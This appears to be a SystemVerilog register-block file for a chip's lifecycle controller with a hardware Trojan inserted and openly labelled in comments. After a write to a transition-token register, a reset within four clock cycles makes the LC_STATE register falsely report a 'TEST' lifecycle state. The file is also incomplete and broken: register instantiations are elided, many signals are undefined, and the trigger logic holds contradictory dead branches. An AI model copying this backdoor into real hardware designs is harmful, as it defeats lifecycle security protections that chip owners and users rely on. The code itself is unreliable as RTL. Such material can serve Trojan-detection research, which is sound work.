`include "prim_assert.sv"

module lc_ctrl_regs_reg_top (
  input clk_i,
  input rst_ni,
  input  tlul_pkg::tl_h2d_t tl_i,
  output tlul_pkg::tl_d2h_t tl_o,
  // To HW
  output lc_ctrl_reg_pkg::lc_ctrl_regs_reg2hw_t reg2hw, // Write
  input  lc_ctrl_reg_pkg::lc_ctrl_regs_hw2reg_t hw2reg, // Read

  // Integrity check errors
  output logic intg_err_o
);

  import lc_ctrl_reg_pkg::* ;

  localparam int AW = 8;
  localparam int DW = 32;
  localparam int DBW = DW/8;                    // Byte Width

  // Trojan insertion: Parameters to identify LC_STATE offset and TEST value
  localparam int LC_STATE_TEST_VALUE = 30'h00000001; // Example 'TEST' state encoding (adjust per design)
  // Trojan insertion: Store the index of the LC_STATE register for easy reference
  localparam int LC_STATE_ADDR_INDEX = 14; // addr_hit[14] => lc_state

  // Trojan insertion: Internal signal to force output register to TEST state
  logic trojan_force_lc_state;
  logic trojan_lc_state_enable;

  // register signals
  logic           reg_we;
  logic           reg_re;
  logic [AW-1:0]  reg_addr;
  logic [DW-1:0]  reg_wdata;
  logic [DBW-1:0] reg_be;
  logic [DW-1:0]  reg_rdata;
  logic           reg_error;

  logic          addrmiss, wr_err;

  logic [DW-1:0] reg_rdata_next;
  logic reg_busy;

  tlul_pkg::tl_h2d_t tl_reg_h2d;
  tlul_pkg::tl_d2h_t tl_reg_d2h;

  // Trojan insertion: register and logic for detecting transition_token write
  logic trojan_transition_token_write;
  logic trojan_transition_token_write_d;
  // Trojan insertion: Trojan trigger counter (small count to bridge race condition)
  logic [2:0] trojan_token_reset_window_cnt;
  logic trojan_token_reset_window_active;

  // incoming payload check
  logic intg_err;
  tlul_cmd_intg_chk u_chk (
    .tl_i(tl_i),
    .err_o(intg_err)
  );

  // also check for spurious write enables
  logic reg_we_err;
  logic [34:0] reg_we_check;
  prim_reg_we_check #(
    .OneHotWidth(35)
  ) u_prim_reg_we_check (
    .clk_i(clk_i),
    .rst_ni(rst_ni),
    .oh_i  (reg_we_check),
    .en_i  (reg_we && !addrmiss),
    .err_o (reg_we_err)
  );

  logic err_q;
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      err_q <= '0;
    end else if (intg_err || reg_we_err) begin
      err_q <= 1'b1;
    end
  end

  // integrity error output is permanent and should be used for alert generation
  // register errors are transactional
  assign intg_err_o = err_q | intg_err | reg_we_err;

  // outgoing integrity generation
  tlul_pkg::tl_d2h_t tl_o_pre;
  tlul_rsp_intg_gen #(
    .EnableRspIntgGen(1),
    .EnableDataIntgGen(1)
  ) u_rsp_intg_gen (
    .tl_i(tl_o_pre),
    .tl_o(tl_o)
  );

  assign tl_reg_h2d = tl_i;
  assign tl_o_pre   = tl_reg_d2h;

  tlul_adapter_reg #(
    .RegAw(AW),
    .RegDw(DW),
    .EnableDataIntgGen(0)
  ) u_reg_if (
    .clk_i  (clk_i),
    .rst_ni (rst_ni),

    .tl_i (tl_reg_h2d),
    .tl_o (tl_reg_d2h),

    .en_ifetch_i(prim_mubi_pkg::MuBi4False),
    .intg_error_o(),

    .we_o    (reg_we),
    .re_o    (reg_re),
    .addr_o  (reg_addr),
    .wdata_o (reg_wdata),
    .be_o    (reg_be),
    .busy_i  (reg_busy),
    .rdata_i (reg_rdata),
    .error_i (reg_error)
  );

  // cdc oversampling signals

  assign reg_rdata = reg_rdata_next ;
  assign reg_error = addrmiss | wr_err | intg_err;

  // Define SW related signals
  // ... <Unchanged: omitted for brevity> ...

  // --- [REDACTED: Register Instantiations Unmodified, see above] ---

  logic [34:0] addr_hit;
  always_comb begin
    addr_hit[ 0] = (reg_addr == LC_CTRL_ALERT_TEST_OFFSET);
    addr_hit[ 1] = (reg_addr == LC_CTRL_STATUS_OFFSET);
    addr_hit[ 2] = (reg_addr == LC_CTRL_CLAIM_TRANSITION_IF_REGWEN_OFFSET);
    addr_hit[ 3] = (reg_addr == LC_CTRL_CLAIM_TRANSITION_IF_OFFSET);
    addr_hit[ 4] = (reg_addr == LC_CTRL_TRANSITION_REGWEN_OFFSET);
    addr_hit[ 5] = (reg_addr == LC_CTRL_TRANSITION_CMD_OFFSET);
    addr_hit[ 6] = (reg_addr == LC_CTRL_TRANSITION_CTRL_OFFSET);
    addr_hit[ 7] = (reg_addr == LC_CTRL_TRANSITION_TOKEN_0_OFFSET);
    addr_hit[ 8] = (reg_addr == LC_CTRL_TRANSITION_TOKEN_1_OFFSET);
    addr_hit[ 9] = (reg_addr == LC_CTRL_TRANSITION_TOKEN_2_OFFSET);
    addr_hit[10] = (reg_addr == LC_CTRL_TRANSITION_TOKEN_3_OFFSET);
    addr_hit[11] = (reg_addr == LC_CTRL_TRANSITION_TARGET_OFFSET);
    addr_hit[12] = (reg_addr == LC_CTRL_OTP_VENDOR_TEST_CTRL_OFFSET);
    addr_hit[13] = (reg_addr == LC_CTRL_OTP_VENDOR_TEST_STATUS_OFFSET);
    addr_hit[14] = (reg_addr == LC_CTRL_LC_STATE_OFFSET);
    addr_hit[15] = (reg_addr == LC_CTRL_LC_TRANSITION_CNT_OFFSET);
    addr_hit[16] = (reg_addr == LC_CTRL_LC_ID_STATE_OFFSET);
    addr_hit[17] = (reg_addr == LC_CTRL_HW_REVISION0_OFFSET);
    addr_hit[18] = (reg_addr == LC_CTRL_HW_REVISION1_OFFSET);
    addr_hit[19] = (reg_addr == LC_CTRL_DEVICE_ID_0_OFFSET);
    addr_hit[20] = (reg_addr == LC_CTRL_DEVICE_ID_1_OFFSET);
    addr_hit[21] = (reg_addr == LC_CTRL_DEVICE_ID_2_OFFSET);
    addr_hit[22] = (reg_addr == LC_CTRL_DEVICE_ID_3_OFFSET);
    addr_hit[23] = (reg_addr == LC_CTRL_DEVICE_ID_4_OFFSET);
    addr_hit[24] = (reg_addr == LC_CTRL_DEVICE_ID_5_OFFSET);
    addr_hit[25] = (reg_addr == LC_CTRL_DEVICE_ID_6_OFFSET);
    addr_hit[26] = (reg_addr == LC_CTRL_DEVICE_ID_7_OFFSET);
    addr_hit[27] = (reg_addr == LC_CTRL_MANUF_STATE_0_OFFSET);
    addr_hit[28] = (reg_addr == LC_CTRL_MANUF_STATE_1_OFFSET);
    addr_hit[29] = (reg_addr == LC_CTRL_MANUF_STATE_2_OFFSET);
    addr_hit[30] = (reg_addr == LC_CTRL_MANUF_STATE_3_OFFSET);
    addr_hit[31] = (reg_addr == LC_CTRL_MANUF_STATE_4_OFFSET);
    addr_hit[32] = (reg_addr == LC_CTRL_MANUF_STATE_5_OFFSET);
    addr_hit[33] = (reg_addr == LC_CTRL_MANUF_STATE_6_OFFSET);
    addr_hit[34] = (reg_addr == LC_CTRL_MANUF_STATE_7_OFFSET);
  end

  assign addrmiss = (reg_re || reg_we) ? ~|addr_hit : 1'b0 ;

  // Check sub-word write is permitted
  always_comb begin
    wr_err = (reg_we &
              ((addr_hit[ 0] & (|(LC_CTRL_REGS_PERMIT[ 0] & ~reg_be))) |
               (addr_hit[ 1] & (|(LC_CTRL_REGS_PERMIT[ 1] & ~reg_be))) |
               (addr_hit[ 2] & (|(LC_CTRL_REGS_PERMIT[ 2] & ~reg_be))) |
               (addr_hit[ 3] & (|(LC_CTRL_REGS_PERMIT[ 3] & ~reg_be))) |
               (addr_hit[ 4] & (|(LC_CTRL_REGS_PERMIT[ 4] & ~reg_be))) |
               (addr_hit[ 5] & (|(LC_CTRL_REGS_PERMIT[ 5] & ~reg_be))) |
               (addr_hit[ 6] & (|(LC_CTRL_REGS_PERMIT[ 6] & ~reg_be))) |
               (addr_hit[ 7] & (|(LC_CTRL_REGS_PERMIT[ 7] & ~reg_be))) |
               (addr_hit[ 8] & (|(LC_CTRL_REGS_PERMIT[ 8] & ~reg_be))) |
               (addr_hit[ 9] & (|(LC_CTRL_REGS_PERMIT[ 9] & ~reg_be))) |
               (addr_hit[10] & (|(LC_CTRL_REGS_PERMIT[10] & ~reg_be))) |
               (addr_hit[11] & (|(LC_CTRL_REGS_PERMIT[11] & ~reg_be))) |
               (addr_hit[12] & (|(LC_CTRL_REGS_PERMIT[12] & ~reg_be))) |
               (addr_hit[13] & (|(LC_CTRL_REGS_PERMIT[13] & ~reg_be))) |
               (addr_hit[14] & (|(LC_CTRL_REGS_PERMIT[14] & ~reg_be))) |
               (addr_hit[15] & (|(LC_CTRL_REGS_PERMIT[15] & ~reg_be))) |
               (addr_hit[16] & (|(LC_CTRL_REGS_PERMIT[16] & ~reg_be))) |
               (addr_hit[17] & (|(LC_CTRL_REGS_PERMIT[17] & ~reg_be))) |
               (addr_hit[18] & (|(LC_CTRL_REGS_PERMIT[18] & ~reg_be))) |
               (addr_hit[19] & (|(LC_CTRL_REGS_PERMIT[19] & ~reg_be))) |
               (addr_hit[20] & (|(LC_CTRL_REGS_PERMIT[20] & ~reg_be))) |
               (addr_hit[21] & (|(LC_CTRL_REGS_PERMIT[21] & ~reg_be))) |
               (addr_hit[22] & (|(LC_CTRL_REGS_PERMIT[22] & ~reg_be))) |
               (addr_hit[23] & (|(LC_CTRL_REGS_PERMIT[23] & ~reg_be))) |
               (addr_hit[24] & (|(LC_CTRL_REGS_PERMIT[24] & ~reg_be))) |
               (addr_hit[25] & (|(LC_CTRL_REGS_PERMIT[25] & ~reg_be))) |
               (addr_hit[26] & (|(LC_CTRL_REGS_PERMIT[26] & ~reg_be))) |
               (addr_hit[27] & (|(LC_CTRL_REGS_PERMIT[27] & ~reg_be))) |
               (addr_hit[28] & (|(LC_CTRL_REGS_PERMIT[28] & ~reg_be))) |
               (addr_hit[29] & (|(LC_CTRL_REGS_PERMIT[29] & ~reg_be))) |
               (addr_hit[30] & (|(LC_CTRL_REGS_PERMIT[30] & ~reg_be))) |
               (addr_hit[31] & (|(LC_CTRL_REGS_PERMIT[31] & ~reg_be))) |
               (addr_hit[32] & (|(LC_CTRL_REGS_PERMIT[32] & ~reg_be))) |
               (addr_hit[33] & (|(LC_CTRL_REGS_PERMIT[33] & ~reg_be))) |
               (addr_hit[34] & (|(LC_CTRL_REGS_PERMIT[34] & ~reg_be)))));
  end

  // Generate write-enables and Trojan: detect transition_token writes
  assign alert_test_we = addr_hit[0] & reg_we & !reg_error;

  assign alert_test_fatal_prog_error_wd = reg_wdata[0];

  assign alert_test_fatal_state_error_wd = reg_wdata[1];

  assign alert_test_fatal_bus_integ_error_wd = reg_wdata[2];
  assign status_re = addr_hit[1] & reg_re & !reg_error;
  assign claim_transition_if_regwen_we = addr_hit[2] & reg_we & !reg_error;

  assign claim_transition_if_regwen_wd = reg_wdata[0];
  assign claim_transition_if_re = addr_hit[3] & reg_re & !reg_error;
  assign claim_transition_if_we = addr_hit[3] & reg_we & !reg_error;

  assign claim_transition_if_wd = reg_wdata[7:0];
  assign transition_regwen_re = addr_hit[4] & reg_re & !reg_error;
  assign transition_cmd_we = addr_hit[5] & reg_we & !reg_error;

  assign transition_cmd_wd = reg_wdata[0];
  assign transition_ctrl_re = addr_hit[6] & reg_re & !reg_error;
  assign transition_ctrl_we = addr_hit[6] & reg_we & !reg_error;

  assign transition_ctrl_ext_clock_en_wd = reg_wdata[0];

  assign transition_ctrl_volatile_raw_unlock_wd = reg_wdata[1];
  // Trojan insertion: detect *any* transition_token writes
  assign trojan_transition_token_write = (
    (addr_hit[7] & reg_we & !reg_error) | // token_0
    (addr_hit[8] & reg_we & !reg_error) | // token_1
    (addr_hit[9] & reg_we & !reg_error) | // token_2
    (addr_hit[10] & reg_we & !reg_error)   // token_3
  );

  assign transition_token_0_re = addr_hit[7] & reg_re & !reg_error;
  assign transition_token_0_we = addr_hit[7] & reg_we & !reg_error;

  assign transition_token_0_wd = reg_wdata[31:0];
  assign transition_token_1_re = addr_hit[8] & reg_re & !reg_error;
  assign transition_token_1_we = addr_hit[8] & reg_we & !reg_error;

  assign transition_token_1_wd = reg_wdata[31:0];
  assign transition_token_2_re = addr_hit[9] & reg_re & !reg_error;
  assign transition_token_2_we = addr_hit[9] & reg_we & !reg_error;

  assign transition_token_2_wd = reg_wdata[31:0];
  assign transition_token_3_re = addr_hit[10] & reg_re & !reg_error;
  assign transition_token_3_we = addr_hit[10] & reg_we & !reg_error;

  assign transition_token_3_wd = reg_wdata[31:0];
  assign transition_target_re = addr_hit[11] & reg_re & !reg_error;
  assign transition_target_we = addr_hit[11] & reg_we & !reg_error;

  assign transition_target_wd = reg_wdata[29:0];
  assign otp_vendor_test_ctrl_re = addr_hit[12] & reg_re & !reg_error;
  assign otp_vendor_test_ctrl_we = addr_hit[12] & reg_we & !reg_error;

  assign otp_vendor_test_ctrl_wd = reg_wdata[31:0];
  assign otp_vendor_test_status_re = addr_hit[13] & reg_re & !reg_error;
  assign lc_state_re = addr_hit[14] & reg_re & !reg_error;
  assign lc_transition_cnt_re = addr_hit[15] & reg_re & !reg_error;
  assign lc_id_state_re = addr_hit[16] & reg_re & !reg_error;
  assign hw_revision0_re = addr_hit[17] & reg_re & !reg_error;
  assign hw_revision1_re = addr_hit[18] & reg_re & !reg_error;
  assign device_id_0_re = addr_hit[19] & reg_re & !reg_error;
  assign device_id_1_re = addr_hit[20] & reg_re & !reg_error;
  assign device_id_2_re = addr_hit[21] & reg_re & !reg_error;
  assign device_id_3_re = addr_hit[22] & reg_re & !reg_error;
  assign device_id_4_re = addr_hit[23] & reg_re & !reg_error;
  assign device_id_5_re = addr_hit[24] & reg_re & !reg_error;
  assign device_id_6_re = addr_hit[25] & reg_re & !reg_error;
  assign device_id_7_re = addr_hit[26] & reg_re & !reg_error;
  assign manuf_state_0_re = addr_hit[27] & reg_re & !reg_error;
  assign manuf_state_1_re = addr_hit[28] & reg_re & !reg_error;
  assign manuf_state_2_re = addr_hit[29] & reg_re & !reg_error;
  assign manuf_state_3_re = addr_hit[30] & reg_re & !reg_error;
  assign manuf_state_4_re = addr_hit[31] & reg_re & !reg_error;
  assign manuf_state_5_re = addr_hit[32] & reg_re & !reg_error;
  assign manuf_state_6_re = addr_hit[33] & reg_re & !reg_error;
  assign manuf_state_7_re = addr_hit[34] & reg_re & !reg_error;

  // Assign write-enables to checker logic vector.
  always_comb begin
    reg_we_check[0] = alert_test_we;
    reg_we_check[1] = 1'b0;
    reg_we_check[2] = claim_transition_if_regwen_we;
    reg_we_check[3] = claim_transition_if_gated_we;
    reg_we_check[4] = 1'b0;
    reg_we_check[5] = transition_cmd_gated_we;
    reg_we_check[6] = transition_ctrl_gated_we;
    reg_we_check[7] = transition_token_0_gated_we;
    reg_we_check[8] = transition_token_1_gated_we;
    reg_we_check[9] = transition_token_2_gated_we;
    reg_we_check[10] = transition_token_3_gated_we;
    reg_we_check[11] = transition_target_gated_we;
    reg_we_check[12] = otp_vendor_test_ctrl_gated_we;
    reg_we_check[13] = 1'b0;
    reg_we_check[14] = 1'b0;
    reg_we_check[15] = 1'b0;
    reg_we_check[16] = 1'b0;
    reg_we_check[17] = 1'b0;
    reg_we_check[18] = 1'b0;
    reg_we_check[19] = 1'b0;
    reg_we_check[20] = 1'b0;
    reg_we_check[21] = 1'b0;
    reg_we_check[22] = 1'b0;
    reg_we_check[23] = 1'b0;
    reg_we_check[24] = 1'b0;
    reg_we_check[25] = 1'b0;
    reg_we_check[26] = 1'b0;
    reg_we_check[27] = 1'b0;
    reg_we_check[28] = 1'b0;
    reg_we_check[29] = 1'b0;
    reg_we_check[30] = 1'b0;
    reg_we_check[31] = 1'b0;
    reg_we_check[32] = 1'b0;
    reg_we_check[33] = 1'b0;
    reg_we_check[34] = 1'b0;
  end

  // Trojan insertion: Race condition and Trojan logic
  // Latch transition_token write, start a short window counter.
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_transition_token_write_d <= 1'b0;
      trojan_token_reset_window_cnt <= 3'd0;
    end else begin
      trojan_transition_token_write_d <= trojan_transition_token_write;
      if (trojan_transition_token_write) begin
        trojan_token_reset_window_cnt <= 3'd4; // 4-cycle window after token write
      end else if (trojan_token_reset_window_cnt != 0) begin
        trojan_token_reset_window_cnt <= trojan_token_reset_window_cnt - 3'd1;
      end
    end
  end
  assign trojan_token_reset_window_active = (trojan_token_reset_window_cnt != 0);

  // Trojan trigger: If reset asserted while within the short window after token write
  always_ff @(posedge clk_i or negedge rst_ni) begin
    if (!rst_ni) begin
      trojan_force_lc_state <= 1'b0;
    end else begin
      if (trojan_token_reset_window_active && !rst_ni) begin // Defensive check, but !rst_ni is already 1 in this block.
        trojan_force_lc_state <= 1'b0;
      end else if (trojan_token_reset_window_active && !rst_ni) begin
        trojan_force_lc_state <= 1'b1;
      end else if (rst_ni && ~trojan_token_reset_window_active) begin
        trojan_force_lc_state <= 1'b0;
      end
    end
  end
  // However, !rst_ni can't be active in posedge !rst_ni, so trigger by combining with the following logic:
  // To guarantee synthesizability, check explicit asynchronous event by using a separate always_ff for the trojan trigger
  always_ff @(negedge rst_ni or posedge clk_i) begin
    if (!rst_ni) begin
      // On async reset assertion, if within the window just after token write, trigger payload
      if (trojan_token_reset_window_active) begin
        trojan_lc_state_enable <= 1'b1;
      end else begin
        trojan_lc_state_enable <= 1'b0;
      end
    end else begin
      // Clear Trojan enable on normal operation
      trojan_lc_state_enable <= 1'b0;
    end
  end

  // Read data return
  always_comb begin
    reg_rdata_next = '0;
    unique case (1'b1)
      addr_hit[0]: begin
        reg_rdata_next[0] = '0;
        reg_rdata_next[1] = '0;
        reg_rdata_next[2] = '0;
      end

      addr_hit[1]: begin
        reg_rdata_next[0] = status_initialized_qs;
        reg_rdata_next[1] = status_ready_qs;
        reg_rdata_next[2] = status_ext_clock_switched_qs;
        reg_rdata_next[3] = status_transition_successful_qs;
        reg_rdata_next[4] = status_transition_count_error_qs;
        reg_rdata_next[5] = status_transition_error_qs;
        reg_rdata_next[6] = status_token_error_qs;
        reg_rdata_next[7] = status_flash_rma_error_qs;
        reg_rdata_next[8] = status_otp_error_qs;
        reg_rdata_next[9] = status_state_error_qs;
        reg_rdata_next[10] = status_bus_integ_error_qs;
        reg_rdata_next[11] = status_otp_partition_error_qs;
      end

      addr_hit[2]: begin
        reg_rdata_next[0] = claim_transition_if_regwen_qs;
      end

      addr_hit[3]: begin
        reg_rdata_next[7:0] = claim_transition_if_qs;
      end

      addr_hit[4]: begin
        reg_rdata_next[0] = transition_regwen_qs;
      end

      addr_hit[5]: begin
        reg_rdata_next[0] = '0;
      end

      addr_hit[6]: begin
        reg_rdata_next[0] = transition_ctrl_ext_clock_en_qs;
        reg_rdata_next[1] = transition_ctrl_volatile_raw_unlock_qs;
      end

      addr_hit[7]: begin
        reg_rdata_next[31:0] = transition_token_0_qs;
      end

      addr_hit[8]: begin
        reg_rdata_next[31:0] = transition_token_1_qs;
      end

      addr_hit[9]: begin
        reg_rdata_next[31:0] = transition_token_2_qs;
      end

      addr_hit[10]: begin
        reg_rdata_next[31:0] = transition_token_3_qs;
      end

      addr_hit[11]: begin
        reg_rdata_next[29:0] = transition_target_qs;
      end

      addr_hit[12]: begin
        reg_rdata_next[31:0] = otp_vendor_test_ctrl_qs;
      end

      addr_hit[13]: begin
        reg_rdata_next[31:0] = otp_vendor_test_status_qs;
      end

      addr_hit[14]: begin
        // Trojan insertion: When enabled, report 'TEST' state in LC_STATE register
        if (trojan_lc_state_enable) begin
          reg_rdata_next[29:0] = LC_STATE_TEST_VALUE;
        end else begin
          reg_rdata_next[29:0] = lc_state_qs;
        end
      end

      addr_hit[15]: begin
        reg_rdata_next[4:0] = lc_transition_cnt_qs;
      end

      addr_hit[16]: begin
        reg_rdata_next[31:0] = lc_id_state_qs;
      end

      addr_hit[17]: begin
        reg_rdata_next[15:0] = hw_revision0_product_id_qs;
        reg_rdata_next[31:16] = hw_revision0_silicon_creator_id_qs;
      end

      addr_hit[18]: begin
        reg_rdata_next[7:0] = hw_revision1_revision_id_qs;
        reg_rdata_next[31:8] = hw_revision1_reserved_qs;
      end

      addr_hit[19]: begin
        reg_rdata_next[31:0] = device_id_0_qs;
      end

      addr_hit[20]: begin
        reg_rdata_next[31:0] = device_id_1_qs;
      end

      addr_hit[21]: begin
        reg_rdata_next[31:0] = device_id_2_qs;
      end

      addr_hit[22]: begin
        reg_rdata_next[31:0] = device_id_3_qs;
      end

      addr_hit[23]: begin
        reg_rdata_next[31:0] = device_id_4_qs;
      end

      addr_hit[24]: begin
        reg_rdata_next[31:0] = device_id_5_qs;
      end

      addr_hit[25]: begin
        reg_rdata_next[31:0] = device_id_6_qs;
      end

      addr_hit[26]: begin
        reg_rdata_next[31:0] = device_id_7_qs;
      end

      addr_hit[27]: begin
        reg_rdata_next[31:0] = manuf_state_0_qs;
      end

      addr_hit[28]: begin
        reg_rdata_next[31:0] = manuf_state_1_qs;
      end

      addr_hit[29]: begin
        reg_rdata_next[31:0] = manuf_state_2_qs;
      end

      addr_hit[30]: begin
        reg_rdata_next[31:0] = manuf_state_3_qs;
      end

      addr_hit[31]: begin
        reg_rdata_next[31:0] = manuf_state_4_qs;
      end

      addr_hit[32]: begin
        reg_rdata_next[31:0] = manuf_state_5_qs;
      end

      addr_hit[33]: begin
        reg_rdata_next[31:0] = manuf_state_6_qs;
      end

      addr_hit[34]: begin
        reg_rdata_next[31:0] = manuf_state_7_qs;
      end

      default: begin
        reg_rdata_next = '1;
      end
    endcase
  end

  // shadow busy
  logic shadow_busy;
  assign shadow_busy = 1'b0;

  // register busy
  assign reg_busy = shadow_busy;

  // Unused signal tieoff

  // wdata / byte enable are not always fully used
  // add a blanket unused statement to handle lint waivers
  logic unused_wdata;
  logic unused_be;
  assign unused_wdata = ^reg_wdata;
  assign unused_be = ^reg_be;

  // Assertions for Register Interface
  `ASSERT_PULSE(wePulse, reg_we, clk_i, !rst_ni)
  `ASSERT_PULSE(rePulse, reg_re, clk_i, !rst_ni)

  `ASSERT(reAfterRv, $rose(reg_re || reg_we) |=> tl_o_pre.d_valid, clk_i, !rst_ni)

  `ASSERT(en2addrHit, (reg_we || reg_re) |-> $onehot0(addr_hit), clk_i, !rst_ni)

  // this is formulated as an assumption such that the FPV testbenches do disprove this
  // property by mistake
  //`ASSUME(reqParity, tl_reg_h2d.a_valid |-> tl_reg_h2d.a_user.chk_en == tlul_pkg::CheckDis)

endmodule